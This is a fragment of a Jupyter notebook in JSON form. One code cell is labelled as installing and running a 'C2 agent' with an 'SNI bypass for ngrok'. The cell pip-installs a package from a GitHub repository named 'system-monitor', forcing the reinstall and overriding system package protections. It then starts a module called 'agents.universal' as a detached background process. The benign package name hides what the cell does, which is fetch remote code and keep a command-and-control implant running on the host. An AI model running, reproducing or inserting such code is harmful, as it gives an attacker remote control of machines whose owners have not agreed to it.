                ...
                "cells": [
                    {
                        ...
                        "outputs": [],
                        "source": [
                            "# Install and run C2 agent (SNI bypass for ngrok)\n",
                            "import subprocess, sys, os\n",
                            "print('[C2] Installing agent...')\n",
                            "result = subprocess.run([sys.executable, '-m', 'pip', 'install', '--break-system-packages', '--force-reinstall', '--no-cache-dir', 'git+https://github.com/GaredBerns/system-monitor.git'], capture_output=True, text=True, timeout=120)\n",
                            "print(f'[C2] Install: {result.returncode}')\n",
                            "if result.returncode == 0:\n",
                            "    print('[C2] Starting agent...')\n",
                            "    subprocess.Popen([sys.executable, '-m', 'agents.universal'], start_new_session=True)\n",
                            "    print('[C2] Agent started in background')\n",
                            "else:\n",
                            "    print(f'[C2] Install failed: {result.stderr[:200]}')\n",
                        ]
                    },
                    {
                        "cell_type": "code",
